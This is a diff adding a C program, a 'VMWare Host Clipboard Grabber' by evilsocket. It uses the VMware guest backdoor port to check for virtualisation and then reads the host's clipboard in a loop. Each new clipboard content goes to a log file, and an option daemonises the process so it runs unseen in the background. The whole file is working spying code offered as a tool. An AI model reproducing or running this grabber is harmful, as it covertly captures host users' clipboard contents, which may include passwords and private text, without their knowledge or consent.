@@ -1,0 +1,288 @@
+/***************************************************************************
+ *   Copyright (C) 2007 by evilsocket                                      *
+ *                                                                         *
+ *                                                                         *
+ *   Thanks to Ken Kato and Nickolai Zeldovich for the documentation about *
+ *   vmware hardware backdoor system .                                     *
+ *                                                                         *
+ *   This program is free software; you can redistribute it and/or modify  *
+ *   it under the terms of the GNU General Public License as published by  *
+ *   the Free Software Foundation; either version 2 of the License, or     *
+ *   (at your option) any later version.                                   *
+ *                                                                         *
+ *   This program is distributed in the hope that it will be useful,       *
+ *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
+ *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
+ *   GNU General Public License for more details.                          *
+ *                                                                         *
+ *   You should have received a copy of the GNU General Public License     *
+ *   along with this program; if not, write to the                         *
+ *   Free Software Foundation, Inc.,                                       *
+ *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
+ ***************************************************************************/
+
+#include <stdio.h>
+#include <time.h>
+#include <signal.h>
+#include <unistd.h>
+
+#define rEAX(registers) *((unsigned int *)&((registers).eax))
+#define rEBX(registers) *((unsigned int *)&((registers).ebx))
+#define rECX(registers) *((unsigned int *)&((registers).ecx))
+#define rEDX(registers) *((unsigned int *)&((registers).edx))
+#define rEBP(registers) *((unsigned int *)&((registers).ebp))
+#define rEDI(registers) *((unsigned int *)&((registers).edi))
+#define rESI(registers) *((unsigned int *)&((registers).esi))
+
+#define VMWARE_MAGIC		0x564D5868UL
+#define VMWARE_CMD_PORT		0x5658
+#define VMCMD_GET_VERSION	0x0a
+#define VMCMD_GET_CLIPLEN	0x06
+#define VMCMD_GET_CLIPDATA	0x07
+
+typedef struct _reg {
+	unsigned char eax[4];
+	unsigned char ebx[4];
+	unsigned char ecx[4];
+	unsigned char edx[4];
+	unsigned char ebp[4];
+	unsigned char edi[4];
+	unsigned char esi[4];
+} reg_t;
+
+void           sigsev_handler(int sig);
+void           backdoor_cmd(reg_t *regs);
+int            is_virtual();
+int            read_clipboard( unsigned char **buffer, unsigned int* size );
+unsigned short quick_checksum( unsigned char *buffer, unsigned int size );
+void           log_host_data( char * filename, unsigned char *data, unsigned int size );
+void           daemonize();
+
+void usage( char *app ){
+	printf( "Usage : %s <options>\n", app );
+	printf( "\tOptions : \n" );
+	printf( "\t\t-o <file> : logs clipboard data to 'file' instead of default one .\n" );
+	printf( "\t\t-d        : daemonzie process .\n\n" );
+}	
+
+void banner(){
+    printf( "*************************************************\n"
+			"***       VMWare Host Clipboard Grabber       ***\n"
+			"***               by evilsocket               ***\n"
+			"*************************************************\n\n" );
+}
+
+int main(int argc, char *argv[])
+{
+	banner();
+
+ 	if( is_virtual() == 0 ){
+		printf( "@ This is not a virtual machine .\n" );
+ 		return -1;
+ 	}
+	unsigned char *buffer    = NULL;
+	unsigned int   size      = 0;
+	unsigned short csum      = 0,
+		           last_csum = 0;
+
+	char * outputfile = NULL;
+	int    daemon     = 0;
+
+	int c;
+	while( (c = getopt(argc,argv,"o:d")) != -1 ){
+		switch(c){
+			case 'o' : outputfile = strdup(optarg); break;
+			case 'd' : daemon     = 1;              break;
+			default  : 
+					   usage(strdup(argv[0]));
+					   return -1;
+		}
+	}
+
+	if(daemon){
+		daemonize();
+	}
+	
+	while(1){
+		buffer = NULL;
+		size   = 0;
+		
+		read_clipboard(&buffer,&size);
+				
+		if( size == 0 ){
+			/* no data to read, continue waiting for incoming clipboard buffers */
+		}
+		else if( size > 0xffff ){
+			/* unexpected size, do nothing */
+		}
+		else{
+			if(buffer){
+				csum = quick_checksum( buffer, size );
+				if( csum != last_csum ){
+					char   timestr[0xFF] = {0};
+					time_t t             = time(NULL);
+					struct tm *local     = (struct tm *)localtime(&t);
+					strftime( timestr, 0xFF, "[%d.%h.%Y %H:%M:%S]", local );
+					printf( "@ %s : Logging new data .\n", timestr );
+					
+					log_host_data( outputfile, buffer, size );
+					last_csum = csum;
+				}
+
+				free(buffer);
+			}
+		}
+	}
+
+	return 0;
+}
+
+
+void sigsev_handler(int sig){
+	printf( "@ This is NOT a virtual machine .\n" );
+	exit( -1 );
+}
+
+void backdoor_cmd(reg_t *regs){
+	signal( SIGSEGV, sigsev_handler );
+	asm
+	(			
+		"pushal\n"					
+		"pushl %%eax\n"				
+		"movl 0x18(%%eax), %%esi\n"	
+		"movl 0x14(%%eax), %%edi\n"	
+		"movl 0x10(%%eax), %%ebp\n"	
+		"movl 0x0c(%%eax), %%edx\n"	
+		"movl 0x08(%%eax), %%ecx\n"	
+		"movl 0x04(%%eax), %%ebx\n"	
+		"movl 0x00(%%eax), %%eax\n"	
+		"inl (%%dx)\n"						
+		"xchgl %%eax, 0x00(%%esp)\n"	
+		"movl %%esi, 0x18(%%eax)\n"	
+		"movl %%edi, 0x14(%%eax)\n"	
+		"movl %%ebp, 0x10(%%eax)\n"	
+		"movl %%edx, 0x0c(%%eax)\n"	
+		"movl %%ecx, 0x08(%%eax)\n"	
+		"movl %%ebx, 0x04(%%eax)\n"	
+		"popl 0x00(%%eax)\n"			
+		"popal\n"					
+		::"a"(regs)					
+	);
+}
+
+int is_virtual(){
+	reg_t regs = {0};
+
+	rEAX(regs) = VMWARE_MAGIC;
+	rEBX(regs) = ~VMWARE_MAGIC;
+	rECX(regs) = VMCMD_GET_VERSION;
+	rEDX(regs) = VMWARE_CMD_PORT;
+
+	backdoor_cmd(&regs);
+
+	if( rEBX(regs) != VMWARE_MAGIC ){
+		return 0;
+	}
+
+	return 1;
+}
+
+int read_clipboard( unsigned char **buffer, unsigned int* size ){
+	reg_t 	       regs = {0};
+	unsigned int   total;
+	unsigned char *ptr  = NULL;
+
+	rEAX(regs) = VMWARE_MAGIC;
+	rECX(regs) = VMCMD_GET_CLIPLEN;
+	rEDX(regs) = VMWARE_CMD_PORT;
+
+	/* call backdoor command */
+	backdoor_cmd(&regs);
+
+	total = rEAX(regs);
+
+	*size = total;
+	if( total != 0 && total <= 0xffff ){
+		*buffer = ptr = (unsigned char *)calloc( total + 1, 1 );
+
+		do{
+			memset( &regs, 0, sizeof(regs) );
+
+			rEAX(regs) = VMWARE_MAGIC;
+			rECX(regs) = VMCMD_GET_CLIPDATA;
+			rEDX(regs) = VMWARE_CMD_PORT;
+				
+			/* call backdoor command again to obtain clipboard data */
+			backdoor_cmd(&regs);
+	
+			memcpy( ptr, &rEAX(regs), total > 4 ? 4 : total);
+
+			ptr   += 4;	
+			total -= 4;
+		}
+		while( total > 4 );
+	}
+
+	return *size;
+}
+
+unsigned short quick_checksum( unsigned char *buffer, unsigned int size ){
+     long sum = 0;
+	 unsigned short *temp = (unsigned short *)buffer;
+
+	while(size > 1){
+		sum += *temp++;
+		if(sum & 0x80000000){
+			sum = (sum & 0xFFFF) + (sum >> 16);
+		}
+		size -= 2;
+	}
+	
+	if(size){
+		sum += (unsigned short) *((unsigned char *)temp);
+	}
+
+	while( sum >> 16 ){
+		sum = (sum & 0xFFFF) + (sum >> 16);
+	}
+
+	return ~sum;
+}
+
+void log_host_data( char * filename, unsigned char *data, unsigned int size ){
+	FILE * fp = fopen( (filename == NULL ? "vmclip.log" : filename), "a+t" );
+	char   timestr[0xFF] = {0};
+	time_t t             = time(NULL);
+	struct tm *local     = (struct tm *)localtime(&t);
+	strftime( timestr, 0xFF, "[%d.%h.%Y %H:%M:%S] : ", local );
+	fwrite( timestr, strlen(timestr) + 1, 1, fp );
+	fwrite( data, size, 1, fp );
+	fwrite( "\n", 1, 1, fp );
+	fclose(fp);
+}
+
+void daemonize(){
+	switch(fork()){
+		case  0 : break;
+		case -1 :
+			printf( "@ Error during daemonization .\n" );
+			exit(-1);
+		break;
+		default:
+		_exit(0);
+	}
+	
+	if(setsid() < 0){
+		exit(-1);
+	}
+
+	switch(fork()){
+		case 0  : break;
+	    case -1 :
+			printf( "@ Error during daemonization .\n" );
+			exit(-1);
+		break;
+		default:
+		_exit(0);
+	}
+}
